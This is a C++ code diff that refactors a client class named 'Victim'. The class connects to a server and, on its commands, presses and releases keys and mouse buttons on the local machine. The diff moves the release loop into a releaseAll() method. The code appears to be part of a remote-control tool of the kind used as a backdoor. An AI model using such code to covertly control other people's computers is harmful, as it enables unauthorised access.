@@ -1,5 +1,4 @@
 #include "victim.h"
-#include "../secret.h"
 
 Victim::Victim()
 {    
@@ -39,6 +38,7 @@ int Victim::controlVictim()
         if (p.getDataSize() == 0) {
             std::cout << "DISCONNECTED FROM SERVER\n";
             isConnected = false;
+            releaseAll();
             connectServer();
         }
 
@@ -47,6 +47,7 @@ int Victim::controlVictim()
         
         //exit program
         if (cmd == 'e') {
+            releaseAll();
             isRunning = false;
         }
         //key pressed-released
@@ -80,17 +81,7 @@ int Victim::controlVictim()
         }
         //release all keys
         else if (cmd == 'a') {
-            for (int i = 0; i < 255; i++) {
-                if (!keysStates[i])
-                    continue;
-                keysStates[i] = false;
-
-                //if its a mouse key, treat it accordingly
-                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
-                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
-                else
-                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
-            }
+            releaseAll();
         }
         //rename client
         else if (cmd == 'w') {
@@ -104,6 +95,7 @@ int Victim::controlVictim()
         else if (cmd == '?') {
             isConnected = false;
             //connect and initialize again
+            releaseAll();
             connectServer();
         }
     }
@@ -152,4 +144,19 @@ init:
     std::cout << "connection with server approved\n";
 
     isConnected = true;
+}
+
+void Victim::releaseAll()
+{
+    for (int i = 0; i < 255; i++) {
+        if (!keysStates[i])
+            continue;
+        keysStates[i] = false;
+
+        //if its a mouse key, treat it accordingly
+        if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
+            Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
+        else
+            Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+    }
 }
